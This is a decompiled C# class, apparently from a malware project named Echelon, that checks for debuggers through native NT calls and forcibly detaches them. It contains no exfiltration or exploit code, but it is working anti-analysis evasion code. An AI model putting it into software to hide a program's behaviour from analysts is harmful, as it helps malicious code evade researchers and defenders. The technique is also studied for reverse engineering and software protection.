using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Echelon.Global.Other;
using Echelon.Global.Other.WinStructs;

namespace Echelon.Global.Protect
{
	// Token: 0x0200005E RID: 94
	internal class DebugProtect2
	{
		// Token: 0x06000234 RID: 564 RVA: 0x00022890 File Offset: 0x00020A90
		public static int PerformChecks()
		{
			if (DebugProtect2.CheckDebugPort() == 1)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("Задействован порт дебаггера: HIT");
				return 1;
			}
			if (DebugProtect2.CheckKernelDebugInformation())
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("Обнарурежена информация ядра дебаггера: HIT");
				return 1;
			}
			if (DebugProtect2.DetachFromDebuggerProcess())
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("Отделение от процесса дебаггера: HIT");
				return 1;
			}
			return 0;
		}

		// Token: 0x06000235 RID: 565 RVA: 0x000228F0 File Offset: 0x00020AF0
		private static int CheckDebugPort()
		{
			IntPtr intPtr = new IntPtr(0);
			int num;
			if (NativeMethods.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, PROCESSINFOCLASS.ProcessDebugPort, out intPtr, Marshal.SizeOf(intPtr), out num) == NtStatus.Success && intPtr == new IntPtr(-1))
			{
				Console.WriteLine("DebugPort : {0:X}", intPtr);
				return 1;
			}
			return 0;
		}

		// Token: 0x06000236 RID: 566 RVA: 0x00022948 File Offset: 0x00020B48
		private unsafe static bool DetachFromDebuggerProcess()
		{
			IntPtr invalid_HANDLE_VALUE = DebugProtect2.INVALID_HANDLE_VALUE;
			uint num = 0U;
			int num2;
			int num3;
			return NativeMethods.NtQueryInformationProcess(Process.GetCurrentProcess().Handle, PROCESSINFOCLASS.ProcessDebugObjectHandle, out invalid_HANDLE_VALUE, IntPtr.Size, out num2) == NtStatus.Success && NativeMethods.NtSetInformationDebugObject(invalid_HANDLE_VALUE, DebugObjectInformationClass.DebugObjectFlags, new IntPtr((void*)(&num)), Marshal.SizeOf(num), out num3) == NtStatus.Success && NativeMethods.NtRemoveProcessDebug(Process.GetCurrentProcess().Handle, invalid_HANDLE_VALUE) == NtStatus.Success && NativeMethods.NtClose(invalid_HANDLE_VALUE) == NtStatus.Success;
		}

		// Token: 0x06000237 RID: 567 RVA: 0x000229BC File Offset: 0x00020BBC
		private unsafe static bool CheckKernelDebugInformation()
		{
			SYSTEM_KERNEL_DEBUGGER_INFORMATION system_KERNEL_DEBUGGER_INFORMATION;
			int num;
			return NativeMethods.NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS.SystemKernelDebuggerInformation, new IntPtr((void*)(&system_KERNEL_DEBUGGER_INFORMATION)), Marshal.SizeOf(system_KERNEL_DEBUGGER_INFORMATION), out num) == NtStatus.Success && system_KERNEL_DEBUGGER_INFORMATION.KernelDebuggerEnabled && !system_KERNEL_DEBUGGER_INFORMATION.KernelDebuggerNotPresent;
		}

		// Token: 0x0400012D RID: 301
		private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
	}
}
